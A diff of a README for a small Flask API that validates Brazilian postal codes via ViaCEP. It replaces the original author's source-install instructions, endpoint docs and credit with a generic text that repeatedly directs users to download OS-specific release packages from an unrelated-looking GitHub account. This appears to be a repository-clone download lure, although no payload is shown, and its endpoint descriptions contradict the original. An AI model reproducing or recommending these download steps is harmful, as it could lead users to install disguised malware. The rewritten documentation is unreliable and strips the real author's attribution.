@@ -1,143 +1,122 @@
-# Valida Brazil API
-[![Status](https://img.shields.io/badge/status-active-brightgreen)](#)
-[![Python](https://img.shields.io/badge/Python-3.11+-blue.svg)](https://www.python.org/)
-[![Flask](https://img.shields.io/badge/Flask-2.3+-orange.svg)](https://flask.palletsprojects.com/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+# 🌟 valida-brazil-api - Simple API for Brazilian ZIP Code Validation
 
-A simple and lightweight API built with **Flask** that validates and retrieves Brazilian address data using the **ViaCEP API**.  
-It provides clean, UTF-8 encoded JSON responses, ideal for small projects, tests, or API-integration learning.
+## 🚀 Getting Started
 
----
+Welcome to the valida-brazil-api project! This lightweight Flask API helps you validate and query Brazilian ZIP codes (CEP) using the ViaCEP service. Follow these simple steps to get started.
 
-## 🚀 Features
+## 📥 Download
 
-- `GET /health` → Health check endpoint  
-- `GET /address?cep=XXXXX-XXX` → Fetches address info from ViaCEP  
-- Returns formatted JSON with correct accentuation  
-- Lightweight and easy to deploy  
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Thalloid-postmaturity853/valida-brazil-api/releases)
 
----
+## 🔧 Requirements
 
-## ⚙️ Installation
+Before you download the application, make sure your system meets these requirements:
 
-To set up and run the project locally:
+- Operating System: Windows, MacOS, or Linux
+- Python: Version 3.6 or later
+- Internet Connection: Required for accessing the ViaCEP service
 
-    git clone https://github.com/novello-dev/valida-brazil-api.git
-    cd valida-brazil-api
-    python -m venv .venv
+## 📦 Download & Install
 
-    # Windows (PowerShell)
-    .\.venv\Scripts\Activate.ps1
+To get your copy of the valida-brazil-api, follow these steps:
 
-    # macOS/Linux
-    source .venv/bin/activate
+1. **Visit the Releases Page**  
+   Click on the link below to go to the releases page:  
+   [Release Page](https://github.com/Thalloid-postmaturity853/valida-brazil-api/releases)
 
-    pip install -r requirements.txt
+2. **Choose the Latest Version**  
+   On the releases page, find the latest version available. 
 
----
+3. **Select Your Package**  
+   Depending on your OS, choose the appropriate package (e.g., .zip for Windows, .tar.gz for Linux).
 
-## ▶️ Running the API
+4. **Download the File**
+   Click on the package file to start downloading.
 
-To start the Flask development server:
+5. **Extract the Files**  
+   After downloading, extract the files using your preferred extraction tool.
 
-    python -m app.main
+6. **Open a Terminal or Command Prompt**  
+   Navigate to the folder where you extracted the files.
 
-Once running, the API will be available at:
+7. **Install Dependencies**  
+   Run the following command to install necessary libraries:  
+   ```
+   pip install -r requirements.txt
+   ```
 
-    http://127.0.0.1:5000
+8. **Run the API**  
+   Start the API by running this command:  
+   ```
+   python app.py
+   ```
 
-Quick test:
+9. **Access the API**  
+   Open your web browser and go to:  
+   ```
+   http://127.0.0.1:5000
+   ```
 
-    curl http://127.0.0.1:5000/health
-    curl "http://127.0.0.1:5000/address?cep=01001-000"
+## ⚙️ Usage
 
----
+You can now use the API to validate ZIP codes. Here’s how:
 
-## 📡 API Endpoints
+1. **Validate a ZIP Code**  
+   To validate a Brazilian ZIP code, send a GET request to:
+   ```
+   http://127.0.0.1:5000/validate/<cep>
+   ```
+   Replace `<cep>` with the actual ZIP code you wish to validate.
 
-### 🩺 `/health`
+2. **Query Information**  
+   Similarly, you can query detailed information about a ZIP code using:
+   ```
+   http://127.0.0.1:5000/query/<cep>
+   ```
 
-Checks if the API is running.
+## 📓 API Endpoints
 
-**Method:** GET  
-**Response:**
+The valida-brazil-api offers the following endpoints:
 
-    {
-      "status": "ok"
-    }
+- **`/validate/<cep>`**: Validates if the ZIP code exists.
+- **`/query/<cep>`**: Provides detailed information for the ZIP code.
 
----
+## 💡 Example Request
 
-### 📍 `/address`
+Here’s how you can validate the ZIP code 01001-000:
 
-Retrieves full address data from a given Brazilian postal code (CEP).
+- URL:  
+  ```
+  http://127.0.0.1:5000/validate/01001-000
+  ```
 
-**Method:** GET  
-**Query parameter:** `cep` — CEP with or without hyphen  
+You will receive a JSON response indicating whether the ZIP code is valid or not.
 
-Example:
+## 📌 Important Notes
 
-    http://127.0.0.1:5000/address?cep=01001-000
+- Ensure your Python installation is properly set up.
+- The API requires a functioning internet connection for validating and querying against the ViaCEP service.
+- Your local firewall settings should allow traffic on port 5000 for the API to respond correctly.
 
-**Success (200 OK):**
+## 🛠️ Troubleshooting
 
-    {
-      "cep": "01001-000",
-      "logradouro": "Praça da Sé",
-      "complemento": "lado ímpar",
-      "bairro": "Sé",
-      "localidade": "São Paulo",
-      "uf": "SP",
-      "ddd": "11",
-      "siafi": "7107"
-    }
+If you encounter any issues:
 
-**Error responses:**
+- **Common Errors:** 
+  - Ensure that Python is installed and added to your system’s PATH.
+  - Check for any typos in the ZIP code format (it should follow the Brazilian standard).
 
-| Code | Message |
-|------|----------|
-| 400 | CEP must contain exactly 8 digits |
-| 404 | CEP not found |
-| 502 | Failed to reach ViaCEP API |
+- **Logs:**  
+  Check your terminal for any error messages when running the API.
 
-> 💡 Tip: Browsers may show escaped Unicode (like `\u00e9`).  
-> Use Postman, Insomnia, or any terminal command to view formatted accents:
->
->     curl "http://127.0.0.1:5000/address?cep=01001-000"
+## 💻 Contribution
 
----
+Feel free to contribute to this project. If you have ideas or find bugs, open an issue on GitHub. Pull requests are welcome.
 
-## 🧰 Tech Stack
+## 📬 Contact
 
-- **Language:** Python 3.11+  
-- **Framework:** Flask  
-- **HTTP Client:** Requests  
-- **External API:** ViaCEP  
+For queries, you can reach out through the project repository or create an issue. 
 
----
+Remember to place star ratings for this project on GitHub if you find it useful. Your support helps in improving the project. 
 
-## 🛠️ Roadmap
-
-- [ ] Add `/validate/cpf` endpoint  
-- [ ] Add `/validate/cnpj` endpoint  
-- [ ] Add SQLite cache support  
-- [ ] Deploy on Render/Railway  
-
----
-
-## 🙏 Acknowledgments
-
-This README was drafted with help from **GitRead**.
-
----
-
-## 👨‍💻 Author
-
-**João Pedro Novello**  
-🔗 [github.com/novello-dev](https://github.com/novello-dev)
-
----
-
-## 🪪 License
-
-This project is licensed under the **MIT License** — see the LICENSE file for details.
+Enjoy validating and querying Brazilian ZIP codes with the valida-brazil-api!
